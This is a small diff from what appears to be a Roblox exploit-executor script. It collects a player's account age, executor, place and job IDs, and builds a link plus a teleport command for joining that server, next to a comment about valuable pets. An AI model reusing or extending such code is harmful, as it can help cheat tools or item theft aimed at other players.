@@ -759,8 +759,8 @@ local accage = plr.AccountAge
 local ExecutorValue = identifyexecutor() or "Unknown"
 local placeId = game.PlaceId
 local jobId = game.JobId
-local browserTeleport = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. (getgenv().realJobId)
-local TeleportScript = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. (getgenv().realJobId) .. "\")"
+local browserTeleport = "roblox://experiences/start?placeId=" .. placeId .. "&gameInstanceId=" .. (getgenv().RealJobId)
+local TeleportScript = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. placeId .. ", \"" .. (getgenv().RealJobId) .. "\")"
 local VersionValue = "1.12 (Added values)"
 
 -- Get valuable pets info
